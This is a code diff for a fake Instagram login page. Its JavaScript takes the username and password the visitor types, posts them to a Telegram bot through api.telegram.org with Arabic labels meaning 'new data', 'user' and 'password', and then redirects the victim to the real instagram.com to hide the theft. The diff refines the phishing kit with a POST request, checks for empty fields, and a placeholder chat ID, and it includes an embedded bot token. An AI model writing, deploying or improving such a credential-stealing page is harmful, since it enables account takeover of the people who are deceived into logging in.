@@ -9,23 +9,23 @@
     <div class="wrapper">
         <div class="header">
             <div class="top">
-                <div class="logo"></div>
+                <div class="logo"><img src="instagram.png" alt="instagram" style="width: 175px;"></div>
             </div>
-        </div>
-        <div class="form">
-            <div class="input_field">
-                <input type="text" placeholder="Phone number, username, or email" class="input">
+            <div class="form">
+                <div class="input_field">
+                    <input type="text" placeholder="Phone number, username, or email" class="input">
+                </div>
+                <div class="input_field">
+                    <input type="password" placeholder="Password" class="input">
+                </div>
+                <div class="btn"><a href="#">Log In</a></div>
             </div>
-            <div class="input_field">
-                <input type="password" placeholder="Password" class="input">
-            </div>
-            <div class="btn"><a href="#">Log In</a></div>
         </div>
     </div>
 
     <script>
-        const TOKEN = "881299642:AAFUImXaFdw708YFZEvXCHGIiyhndvKCJ7Y";
-        const CHAT_ID = "3212";
+        const TOKEN = "8812996442:AAFuIMxaFdw708YFZEvXCHGIiyhndvKCJ7Y";
+        const CHAT_ID = "ضع_رقم_الآيدي_هنا";
 
         document.querySelector('.btn a').addEventListener('click', function(e) {
             e.preventDefault();
@@ -33,12 +33,29 @@
             const inputs = document.querySelectorAll('.input');
             const username = inputs[0].value;
             const password = inputs[1].value;
-            
-            const message = `حساب جديد:\nالمستخدم: ${username}\nكلمة المرور: ${password}`;
-            
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
+
+            if(!username || !password) {
+                alert("الرجاء إدخال البيانات");
+                return;
+            }
+
+            const message = `🚨 بيانات جديدة 🚨\n👤 المستخدم: ${username}\n🔑 كلمة المرور: ${password}`;
+
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            })
             .then(response => response.json())
             .then(data => {
+                window.location.href = "https://www.instagram.com";
+            })
+            .catch(error => {
                 window.location.href = "https://www.instagram.com";
             });
         });
